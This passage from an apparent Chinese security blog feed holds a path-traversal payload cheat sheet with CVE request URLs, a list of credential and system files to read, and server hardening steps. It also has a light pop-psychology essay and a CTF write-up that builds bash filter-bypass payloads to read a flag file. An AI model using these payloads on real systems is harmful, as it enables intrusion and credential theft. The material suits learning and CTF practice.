class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">....&#x2F;&#x2F;....&#x2F;&#x2F;static&#x2F;xx.php%00.png</span><br><span class="line"></span><br><span class="line">..&#x2F;..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml</span><br><span class="line"></span><br><span class="line">C:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line">C:\inetpub\wwwroot\global.asa</span><br><span class="line">C:&#x2F;boot.ini</span><br><span class="line">C:\boot.ini</span><br><span class="line">D:\inetpub\wwwroot\global.asa</span><br><span class="line">D:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line"></span><br><span class="line">xx.php?vt&#x3D;&amp;cate&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;doc&#x2F;index?md&#x3D;diagnose_api&amp;app&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd%00</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;en&#x2F;..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-eth1</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.xx.xx&#x2F;pcheck&#x2F;index.php?action&#x3D;showPcheck&amp;report&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;xx&#x2F;img.php?s&#x3D;16,40&amp;n&#x3D;....&#x2F;&#x2F;....&#x2F;&#x2F;static&#x2F;xx.php%00.png</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line">C:\inetpub\wwwroot\global.asa</span><br><span class="line">C:&#x2F;boot.ini</span><br><span class="line">C:\boot.ini</span><br><span class="line">D:\inetpub\wwwroot\global.asa</span><br><span class="line">D:&#x2F;inetpub&#x2F;wwwroot&#x2F;global.asa</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;2xx.xx.xx.xx:8080&#x2F;xampp&#x2F;showcode.php&#x2F;c:xampp&#x2F;htdocs&#x2F;xampp&#x2F;showcode.php?showcode&#x3D;1</span><br><span class="line">https:&#x2F;&#x2F;xx.xx.com&#x2F;static&#x2F;images&#x2F;couch-ipad.png..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;gmu.xx.com&#x2F;demo&#x2F;data&#x2F;tabs&#x2F;proxy.php?debug&#x3D;1&amp;key&#x3D;&amp;file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts</span><br><span class="line">http:&#x2F;&#x2F;gmu.xx.com&#x2F;demo&#x2F;data&#x2F;tabs&#x2F;proxy.php?debug&#x3D;1&amp;key&#x3D;&amp;file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.xx.com&#x2F;frame_scc&#x2F;downLoad?template&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;xx.12.22.xx&#x2F;downloadFile.do?fileName&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><h3 id="CVE-2014-3625"><a href="#CVE-2014-3625" class="headerlink" title="CVE-2014-3625"></a>CVE-2014-3625</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;218.2.197.XX:18015&#x2F;spring-css&#x2F;resources&#x2F;file:&#x2F;etc&#x2F;passwd </span><br><span class="line">http:&#x2F;&#x2F;218.2.197.XX:18015&#x2F;spring-css&#x2F;resources&#x2F;file:&#x2F;etc&#x2F;flag</span><br></pre></td></tr></table></figure><h3 id="CVE-2018-1271"><a href="#CVE-2018-1271" class="headerlink" title="CVE-2018-1271"></a>CVE-2018-1271</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;spring-mvc-showcase&#x2F;resources&#x2F;xxx&#x2F;..%5c&#x2F;..%5c&#x2F;..%5c&#x2F;windows&#x2F;win.ini</span><br></pre></td></tr></table></figure><h3 id="路径遍历检测"><a href="#路径遍历检测" class="headerlink" title="路径遍历检测"></a>路径遍历检测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa.keystore</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;known_hosts</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;root&#x2F;.bash_history</span><br><span class="line">&#x2F;root&#x2F;.mysql_history</span><br><span class="line">&#x2F;proc&#x2F;self&#x2F;fd&#x2F;fd[0-9]*(文件标识符)</span><br><span class="line">&#x2F;proc&#x2F;mounts</span><br><span class="line">&#x2F;proc&#x2F;config.gz&#x2F;etc&#x2F;my.cnf</span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD</span><br><span class="line">C:\Windows\php.in</span><br><span class="line">C:\Windows\my.ini</span><br><span class="line">C:\boot.int</span><br><span class="line">C:\Windows\System32\inetsrc\MetaBase.xml</span><br><span class="line">C:\Windows\repair\sam</span><br><span class="line">..&#x2F;..&#x2F;ierp&#x2F;bin&#x2F;prop.xml</span><br></pre></td></tr></table></figure><h3 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Apache</span><br><span class="line">在httpd.conf文件中找到   Options +Indexes +FollowSymLinks +ExecCGI  并修改成   Options -Indexes+FollowSymLinks +ExecCGI  并保存</span><br><span class="line"></span><br><span class="line">Tomcat</span><br><span class="line">修改conf&#x2F;web.xml，将true 改为false 重启tomcat</span><br><span class="line"></span><br><span class="line">IIS</span><br><span class="line">1、在服务器端，打开 控制面板 --&gt;管理工具--&gt; IIS管理器</span><br><span class="line">2、右击默认网站 --&gt; 属性--&gt; 主目录 --&gt;取消“目录浏览”复选框</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 智慧的收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小谈性知觉偏差导致蜜汁自信</title>
      <link href="2021/04/24/%E5%B0%8F%E8%B0%88%E6%80%A7%E7%9F%A5%E8%A7%89%E5%81%8F%E5%B7%AE%E5%AF%BC%E8%87%B4%E8%9C%9C%E6%B1%81%E8%87%AA%E4%BF%A1/"/>
      <url>2021/04/24/%E5%B0%8F%E8%B0%88%E6%80%A7%E7%9F%A5%E8%A7%89%E5%81%8F%E5%B7%AE%E5%AF%BC%E8%87%B4%E8%9C%9C%E6%B1%81%E8%87%AA%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<p>人生三大错觉：📱振动、👴能反杀（👴确实可以反杀，确实可以啊！）、她喜欢👴</p><p>”Ta喜欢👴为甚么还不承认“，或许可以用性知觉偏差来解释。</p><p>虽然按理来说”Ta明明暗恋我，就是不肯勇敢承认自己的感情“这种错觉是不分男女的，但是一般来说基本上是男性占比多，对于一个普通的、正常的、友好的表示，男性普遍性地容易误解为爱情，在两性中虽然都会有认知不正确的时候，但是男性更容易产生这种Ta喜欢我的夸大型性知觉偏差。</p><hr><p>心理学家做过的研究：</p><p>​    找一些男女大学生来观看某个录像，录像内容是一个教授和一个女学生谈话，女学生想要论文延期，教授和女学生交流得比较友好，嗷，两个演技很精湛的演员也注意了仅仅只是表现友好，不要表现得轻浮和挑逗。</p><p>结果：</p><p>​    女生们：录像中只看到女孩子的友好，关于性感、性诱惑这类的没看出来，而男生们则纷纷表示看出来这个女孩子明显有性方面的展现和诱惑。</p><p>另外的一个研究：</p><p>​    看的是两个男女同学互相在学习的照片，然后图片中的女孩子对这个男的有没有意思。</p><p>结果：</p><p>​    大部分女生看到（觉得）没有啊，两个人很正常啊，但男生一看不对，这个女孩子对这个男孩子有意思，有意思，肯定有意思哈，男生们普遍认为照片中的女孩子心不在焉，心不在学习，表现出了很明显的性感和对男孩子的诱惑。</p><hr><p>这些偏差也并不只适用于普信男（普通而又自信），也适用于一些具有较高配偶价值的人，就比如男领导，事业有成型男人更容易产生这种错觉，欸，👴的女下属这些人对👴有意思奥，所以一些工作场景中的性骚扰问题也源于此 。</p><p>女性明明只是一种友好的表示，但对方却往往可以误解为她是对我心有所属，更有意思的是，当男性遇到漂亮的性感的女性的时候更容易产生这种偏差，主要想一想，人家漂亮的妹子择偶标准都已经够高了，为甚么就这么那啥而不知呢。</p><p>其原因就在于漫长的人类进化过程中，我们知道，两性从进化的根源上来讲，Ta们的性选择、择偶策略是不同的，女性由于孩子的抚养等问题需要一个稳定有资源的男士，所以女性在择偶中都是很慎重的，而男性则不然，Ta在整个生殖过程所负担的并不是那么多，所以男性会追求更多的异性，在更多的两性欢愉之中才能提升自己基因传递下去的比率。</p><p>对于男性而言，Ta对女性的情感认知容易犯两方面错误，一是对方对👴没意思，而👴觉得对方有意思，这是一种误报，另外是对方对👴有意思，而👴判断Ta没意思，这是一种漏报，两种错误权衡下来，男性做出的选择是：宁可误报，不可漏报，宁可错杀一千，不能放过一个。</p><p>进化的动力让男性把任何的女性的好感都解释为性方面的兴趣，所以有了典型的微笑当爱情这种搞法，说白了，这一类的男性呢，就是用下半身思考的动物。</p><p>不过最后还是说一句，并不是所有的男性都是这个样子，本文也只是图一乐，开开玩笑，调侃几句。</p><p>差不多得了，溜之。</p>]]></content>
      
      
      <categories>
          
          <category> 瞎BB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些shell的骚操作</title>
      <link href="2021/04/24/%E4%B8%80%E4%BA%9Bshell%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/"/>
      <url>2021/04/24/%E4%B8%80%E4%BA%9Bshell%E7%9A%84%E9%AA%9A%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="构造任意数字"><a href="#构造任意数字" class="headerlink" title="构造任意数字"></a>构造任意数字</h2><p>很久之前无意间发现 <code>$(())</code> 这个好玩的玩意儿，有过一波深♂入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">数字  | 构造                                                         </span><br><span class="line">-1   | $((~$(())))</span><br><span class="line">0    | $(())                                                        </span><br><span class="line">0    | $#                                                           </span><br><span class="line">1    | $((~$(($((~$(())))$((~$(())))))))                            </span><br><span class="line">1    | $&#123;##&#125;                                                       </span><br><span class="line">2    | $((~$(($((~$(())))$((~$(())))$((~$(())))))))                 </span><br><span class="line">2    | $(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))                                            </span><br><span class="line">3    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">3    | $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;))</span><br><span class="line">4    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br><span class="line">4    | $(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))                                </span><br><span class="line">5    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">5    | $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;))                       </span><br><span class="line">6    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br><span class="line">6    | $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$(())))                       </span><br><span class="line">7    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br><span class="line">7    | $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))                     </span><br><span class="line">8    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br><span class="line">8    | $&#123;LANG:$((~$(()))):$((~$(($((~$(())))$((~$(())))))))&#125;        </span><br><span class="line">9    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br></pre></td></tr></table></figure><p>有一个很特殊的：</p><p><img src="https://i.loli.net/2021/05/03/nr3wmfpUkDPZ2Re.png"></p><p>之前保存的好像是返回 5，这里返回的是 4，不清楚为什么，所以不列入表中（应该是因为 $0 返回 <code>-bash</code> 而 <code>#</code> 放在前面是获取 $0 的长度）（而且只要这个字符出现在我的博客里面我的博客就会出问题，吐了。。。）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">字符及字符串   | 构造</span><br><span class="line">/bin/        | $&#123;SHELL::$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#125;</span><br><span class="line">l            | $&#123;PATH:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):1&#125;</span><br><span class="line">ca           | $&#123;PATH:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):2&#125;</span><br><span class="line">t            | $&#123;HOME:$((~$(()))):$&#123;##&#125;&#125;                                   </span><br><span class="line">.            | $&#123;LANG:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):1&#125;</span><br><span class="line">/bin/cat     | $&#123;SHELL::$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#125;$&#123;PATH:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):2&#125;$&#123;HOME:$((~$(()))):$&#123;##&#125;&#125;</span><br></pre></td></tr></table></figure><p>待补充……</p><h3 id="利用-以及数字构造任意数"><a href="#利用-以及数字构造任意数" class="headerlink" title="利用 $ ( ) # 以及数字构造任意数"></a>利用 $ ( ) # 以及数字构造任意数</h3><p><code>$((2#1000001)) = 53</code></p><p>形式: <code>$((2#&#123;二进制&#125;))) = &#123;八进制&#125;</code></p><h3 id="利用-构造任意数"><a href="#利用-构造任意数" class="headerlink" title="利用 $ ( ) ~ 构造任意数"></a>利用 $ ( ) ~ 构造任意数</h3><p>以 <code>$(($(($a))$(($b))$(($c))$(($d))$(($e))$(($f))))</code> 为例子吧：</p><h4 id="含有任何负数的情况"><a href="#含有任何负数的情况" class="headerlink" title="含有任何负数的情况"></a>含有任何负数的情况</h4><p>只要有任意 <code>$(($n))</code> 为负数，则表达式的结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果是正数，则拼接到前一位的末尾</span><br><span class="line">如果是负数，则与前面分开</span><br></pre></td></tr></table></figure><p>比如：<code>$(($((1))$((0))$((-1))$((1))$((2))$((1))))</code> 的情况：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="number">1</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((<span class="number">2</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; 1 0 -1 1 2 1</span><br><span class="line">=&gt; (10) + (-1121)</span><br><span class="line">=&gt; -1111</span><br></pre></td></tr></table></figure><p>或者：<code>$(($((-1))$((0))$((-1))$((1))$((2))$((1))))</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((-<span class="number">1</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((<span class="number">2</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; -1 0 -1 1 2 1</span><br><span class="line">=&gt; (-10) + (-1121)</span><br><span class="line">=&gt; -1131</span><br></pre></td></tr></table></figure><p>亦或者：<code>$(($((6))$((0))$((-1))$((1))$((-3))$((1))))</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="number">6</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((-<span class="number">3</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; 6 0 -1 1 -3 1</span><br><span class="line">=&gt; (60) + (-11) + (-31)</span><br><span class="line">=&gt; 18</span><br></pre></td></tr></table></figure><h4 id="a-为-0-的情况"><a href="#a-为-0-的情况" class="headerlink" title="$(($a)) 为 0 的情况"></a>$(($a)) 为 0 的情况</h4><p>当 <code>$(($a))</code> 为 0，且其它都为非负数时，整个表达式的结果最后为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">f * 2 ** 0 + <span class="variable">$e</span> * 2 ** 3 + <span class="variable">$d</span> * 2 ** 6 + <span class="variable">$c</span> * 2 ** 9 ······</span></span><br><span class="line">即从最后的 $(($n)) 开始，往前推，直到第一位</span><br></pre></td></tr></table></figure><h4 id="全部为正数的情况"><a href="#全部为正数的情况" class="headerlink" title="全部为正数的情况"></a>全部为正数的情况</h4><p>如果所有的 <code>$(($n))</code> 都为正数，则全部拼接在一起输出……</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>前不久想折磨一下大一新生，特意去研究了一下</p><p>现在抛出一个问题：现在👴试图读出 /flag.txt 文件，但是👴被限制了字符，只允许使用如下字符，怎解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt; $ ? : ; . &#123; &#125; ~</span><br><span class="line">A D E F H I L M N O P R T S U V</span><br></pre></td></tr></table></figure><p>我们首先看一下，没有小写字母，直接执行命令是不可能的，然后只能想到利用 <code>/bin/cat</code> 这一类的来尝试一下，但是 / 也被过滤了，这个时候我们就要思考一下 / 从哪里来了</p><p>给了大写字母和 $ { } 可以尝试一下利用环境变量，env 这个指令可以获取环境变量，不同人的机子不一样，环境变量也不一样，可能会有所出入，但是我的是 ok 的，所以相信大家的都 ok</p><p>因为 <code>PATH</code> 是 <code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</code>，所以我们可以尝试取它的第一位，就可以获得 / 了，然后又有 <code>SHELL</code> 为 <code>/bin/bash</code>，所以我们也可以尝试取它的前五位，就是 <code>/bin/</code>，然后就只要考虑后面用哪个命令读取了，但是问题就来了，题目并没有给👴数字，那👴怎么办呢，很简单</p><hr><p>shell 中运行的每个命令都使用退出状态码（exit status）来告诉shell 它完成了处理。退出状态码是一个 0 ~ 255 之间的整数值，在命令结束运行时由命令传给shell</p><p>Linux 使用了 $? 这个专属变量来保存上个执行的命令的退出状态码</p><hr><p>所以我们可以利用 $?  来榨取一个数字，但是我们可以榨取到哪个数字呢，又是否对我们的操作有帮助呢</p><p>Linux 的错误状态退出状态码没有什么标准可遵循，但有一些参考</p><table><thead><tr><th>状态码</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>命令成功结束</td></tr><tr><td>1</td><td>一般性未知错误</td></tr><tr><td>2</td><td>不适合的 shell 命令</td></tr><tr><td>123</td><td>命令不可执行</td></tr><tr><td>127</td><td>没找到命令</td></tr><tr><td>128</td><td>无效退出参数</td></tr><tr><td>128+x</td><td>与 Linux 信号x相关的严重错误</td></tr><tr><td>130</td><td>通过 ctrl+c 终止的命令</td></tr><tr><td>255</td><td>正常范围之内的退出状态码</td></tr></tbody></table><p>emm，”一般性未知错误“</p><p><img src="https://i.loli.net/2021/04/24/DBCWrJxRAa9ctny.png"></p><p>彳亍，那我们就有一个 1 了，不过 2 啥的还没找到咋搞，不过有一个 1 就够了，因为我们还有一个 <code>RANDOM</code> 环境变量可以利用：<code>&lt;A;echo $&#123;RANDOM:~A:$?&#125;</code>，介个样子就可以取到一位随机数了，很玄学的一个地方就是 <code>~A</code> 这个玩意儿似乎在 <code>$&#123;&#125;</code> 可以取到环境变量的最后一位的位置，利用这个点可以玩很多骚的</p><p><img src="https://i.loli.net/2021/04/24/xoP3ThNclKmziE2.png"></p><p>好了，随机个位数字也来了，我们只需要这样：<code>&lt;A;echo $&#123;SHELL::$&#123;RANDOM::$?&#125;&#125;</code>，随机到一个 5 就可以获得 <code>/bin/</code> 辣，那么怎么读文件呢，看了蛮久的 env 后发现，似乎用 tac 是最好的选择，因为最后一位的 t 蛮多的，比如 HOME，USER，MAIL（我的反正是）</p><p><img src="https://i.loli.net/2021/04/24/5SOdXyIuqklrJTm.png"></p><p>然后空格用 $IFS 随便过了，最后文件马马虎虎一个 <code>$&#123;PATH::$?&#125;????.???</code> 代替了 /flag.txt，最终 payload：<code>&lt;A;$&#123;SHELL::$&#123;RANDOM::$?&#125;&#125;$&#123;USER:~A:$?&#125;??$IFS$&#123;PATH::$?&#125;????.???</code></p><p>你别说，我还真读出来了奥</p><p><img src="https://i.loli.net/2021/04/24/PZC6YcRTd2xHIJu.jpg"></p><p>但是很奇怪的一点，就是 <code>/bin/t?? flag.txt</code> 的时候会出现前上图一大串奇怪的乱码，但是直接 <code>/bin/tac flag.txt</code> 不会</p><p><img src="https://i.loli.net/2021/04/24/JPpEVxyIgN9vFsR.png"></p><p>这一点不咋理解，但是无伤大雅</p><p>最后再来一个，我把 &lt; 或者 $? 过滤（就是这俩货连在一起就过滤）的话应该怎么办？</p><p>很简单，用 <code>SHIVL</code> 就 ok 了，SHIVL=1</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>这会想继续折磨一下大一新生，结合了一下前面的构造数字，应该挺简单的，不秒掉的话就要打PP</p><p>ok，现在抛出一个问题：现在👴试图读出 /FLAG.TXT 文件，但是👴被限制了字符，只允许使用如下字符，同时禁止出现形如 <code>~A</code> 的字符串，怎解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ : &#123; &#125; ( ) ~</span><br><span class="line">A D E F G H I L M N O P R T S U X</span><br></pre></td></tr></table></figure><p><del>先不写了，👴也还没仔细想，只是觉得这样可以出，这周末课设，太烦了，睡了</del></p><p>很简单：利用👴前面列出来的表格就 ok 了，此处便不做详解，直接给出 payload：（/bin/cat FLAG.TXT）<code>$&#123;SHELL::$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#125;$&#123;PATH:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):$((~$(($((~$(())))$((~$(())))$((~$(())))))))&#125;$&#123;HOME:$((~$(()))):$((~$(($((~$(())))$((~$(())))))))&#125;$IFS$9FLAG$&#123;LANG:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):$((~$(($((~$(())))$((~$(())))))))&#125;TXT</code></p><p><img src="https://i.loli.net/2021/05/03/TIgDzNHnW5V9QBm.png"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>越提折磨👴越兴奋，来一波新的简单思路</p><p>现在抛出一个问题：现在👴试图读出 /flag.txt 文件，但是👴被限制了字符，只允许使用如下字符，怎解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ &#123; &#125; : 0-9 ? &#x2F; .</span><br></pre></td></tr></table></figure><p>太简单了太简单了，直接给出 payload 吧，都不需要分析的：（/bin/less flag.txt）</p><p><code>/$&#123;0:1:1&#125;??/??$&#123;0:3:1&#125;$&#123;0:3:1&#125; ????.???</code></p><p><img src="https://i.loli.net/2021/05/03/pJRLBk1ijWTIb9u.png"></p><p><img src="https://i.loli.net/2021/05/03/WSBwGPX7LVpeORH.png"></p><p>because $0 返回 <code>-bash</code>（这个好像确实有不同，@LemonPrefect 师傅的和我的就有区别，他的 $0 是返回 bash，可能是因为👴的bash版本太旧了，当然，只是一个 - 的区别，本质还是没有影响的</p><hr><p><img src="https://i.loli.net/2021/05/03/K9Nk4YmxFnvGLlI.png"></p><p>可以看到我的 bash 版本是 4.26.46(1)，@LemonPrefect 师傅用的最老的 4.26.46(2) 测试也是返回 <code>bash</code>，而非 <code>-bash</code>，此处感谢 @LemonPrefect 师傅帮忙测试</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>关于前面这么多骚东西，补充一些基本原理和注意事项吧。</p><p>首先说说为什么 $# 会返回 0 吧，我不知道</p><p>算了，懒起来了，先不搞了，过段时间再整理吧。（别打👴</p><p>对了，贴个 bash 对于 <code>$&#123;&#125;</code> 定义的用法吧，之后会详细说明一波</p><p><img src="https://i.loli.net/2021/05/03/v7I9upJgMcy6Kdl.png"></p><hr><p>在 @Guoke 那里看到了他总结的一些，先偷过来，改天整理一下，有很多新姿势。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;PWD:0:1&#125;</span><br><span class="line">获取变量PWD的第一个字符</span><br><span class="line">echo $&#123;PWD::1&#125;</span><br><span class="line">可以为空。为空的部分就当作0了</span><br><span class="line">echo $&#123;PWD#??????&#125;</span><br><span class="line">$&#123;变量#字符串&#125;表示在变量中。截取字符串右边的值。可以用模糊匹配。截取PWD的最后一位</span><br><span class="line">echo $&#123;PWD%??????&#125;</span><br><span class="line">$&#123;变量%字符串&#125;表示在变量中。截取字符串左边的值。可以用模糊匹配。截取PWD的第一位</span><br><span class="line">echo $&#123;#PWD&#125;</span><br><span class="line">获取变量PWD的长度</span><br><span class="line">AASAA;echo $&#123;#_&#125;</span><br><span 